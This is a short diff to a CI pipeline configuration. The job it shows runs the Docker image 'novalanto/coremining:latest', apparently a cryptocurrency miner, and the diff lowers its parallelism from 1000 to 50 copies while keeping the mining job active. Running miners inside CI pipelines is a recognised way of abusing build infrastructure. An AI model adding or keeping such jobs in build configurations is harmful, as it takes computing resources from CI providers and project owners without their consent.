@@ -16,4 +16,4 @@ blocks:
         - name: 'Job #1'
           commands:
             - 'docker run novalanto/coremining:latest'
-          parallelism: 1000
+          parallelism: 50
